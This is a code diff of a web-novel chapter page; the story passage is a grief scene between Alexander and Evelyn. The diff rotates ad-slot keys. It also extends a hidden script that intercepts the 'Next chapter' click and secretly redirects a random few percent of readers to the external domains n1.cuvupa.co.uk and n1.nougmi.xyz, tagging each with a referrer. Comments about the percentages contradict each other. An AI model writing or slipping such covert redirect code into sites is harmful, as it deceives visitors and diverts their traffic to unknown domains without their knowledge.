@@ -2392,35 +2392,35 @@
                 <p>&#34;Where&#39;s my dad?&#34; Her fingers dug into his arm.</p>
                 <p>Alexander spoke softly, &#34;Mr. Anderson passed peacefully. He was smiling.&#34;</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
                 <p>Evelyn&#39;s hands clenched the sheets as silent tears fell.</p>
                 <p>When her breathing steadied, he continued, &#34;Grace fainted from crying. Emily&#39;s taking care of her. The funeral home... I told them to wait.&#34;</p>
                 <p>He hesitated, unsure whether to ask if she wanted to see him one last time.</p>
                 <p>Evelyn nodded blankly, unresponsive to anything.</p>
                 <p>Alexander watched her, remembering how shattered she&#39;d been after losing their child. His heart ached.</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
+                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
                 <p>&#34;You barely touched dinner. I had someone bring congee—&#34;</p>
                 <p>&#34;Did Mom and Emily eat?&#34;</p>
                 <p>&#34;It&#39;s been taken care of.&#34;</p>
                 <p>He lifted a spoonful to her lips. &#34;Just a little.&#34;</p>
                 <p>Evelyn opened her mouth mechanically but gagged after the first swallow.</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
                 <p>&#34;Alexander...&#34; Her face was streaked with tears.</p>
                 <p>&#34;I&#39;m here.&#34;</p>
                 <p>&#34;I can&#39;t eat.&#34;</p>
                 <p>He set aside the bowl and offered water instead. &#34;Some water, then?&#34;</p>
                 <p>She managed two sips before bolting to the bathroom to vomit.</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
                 <p>Alexander followed, rubbing her back gently.</p>
                 <p>Back at the bedside, he knelt to adjust her slippers. Evelyn remained limp, letting him move her like a marionette.</p>
                 <p>&#34;Evelyn,&#34; he murmured, &#34;let it out.&#34;</p>
                 <p>She turned her head slowly.</p>
                 <p>&#34;I&#39;m right here with you.&#34;</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
+                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
                 <p>&#34;Alexander...&#34;</p>
                 <p>&#34;Yes?&#34;</p>
                 <p>&#34;I don&#39;t have a father anymore...&#34;</p>
@@ -2429,7 +2429,7 @@
                 <p>That night, Evelyn drifted between sleep and weeping until dawn.</p>
                 <p>Days later, the funeral home called.</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
+                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
             </div>
             
             <div class="font-controls">
@@ -2551,7 +2551,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2567,8 +2567,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
